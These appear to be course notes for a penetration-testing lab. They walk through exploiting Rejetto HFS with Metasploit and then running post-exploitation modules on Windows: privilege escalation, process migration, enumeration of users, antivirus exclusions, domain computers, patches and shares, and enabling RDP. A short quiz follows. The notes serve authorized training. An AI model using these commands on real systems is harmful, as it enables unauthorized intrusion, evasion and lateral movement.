
Setup msfconsole
```
service postgresql start && msfconsole
workspace -a post_exploitation
setg RHOSTS <target_ip>
setg RHOST <target_ip>
setg LHOST <local_ip>
```

Scan and enumerate target 
```
db_nmap -sV <target_ip> 
```

Search and setup exploit
```
search rejetto
use exploit/windows/http/rejetto_hfs_exec
exploit
```

Get system information via meterpreter
```
getsystem
getuid
show_mount
ps
```

Migrate to a process via process
```
migrate <process_id>
```

Migrate process via module
```
use post/windows/manage/migrate
set SESSION <session_id>
exploit
```

Gather windows privileges
```
use post/windows/gather/win_privs
set SESSION <session_id>
exploit
```

Check for logged on users
```
search enum_logged_on
use post/windows/gather/enum_logged_on_users
options
set SESSION <session_id>
exploit
```

Check if remote host is a virtual machine
```
search checkvm
use post/windows/gather/checkvm 
set SESSION <session_id>
exploit
```

Check installed applications on target
```
search enum_applications
use post/windows/gather/enum_applications
set SESSION <session_ID>
exploit
```

Information enumerated is stored in the
```
/root/.msf3/loot
```
directory

Check which files and folder are not being scanned 
```
search type:post platform:windows enum_av
use post/windows/gather/enum_av_excluded
set SESSION <session_id>
exploit
```

Check other computers on network/domain
```
search enum_computer
use post/windows/gather/enum_computers
options
set SESSION <session_id>
exploit
```

Check for patches on target machine
```
search enum_patches
use post/windows/gather/enum_patches
options
set SESSION <session_id>
exploit
```

Check shares on target
```
search enum_shares
use post/windows/gather/enum_shares
set SESSION <session_id>
exploit
```

Check if RDP is enabled
```
use post/windows/manage/enable_rdp
set SESSION <session_id>
exploit
```
## Quiz

Which one of the following MSF post modules can be used to enumerate Windows privileges?

	post/windows/gather/win_privs

Which one of the following Windows commands can be used to enumerate system information manually?

	systeminfo

Which one of the following meterpreter commands can be used to migrate to another process?

	migrate


## Lab

This lab covers the process of automating various phases of post-exploitation through the use of various Metasploit modules.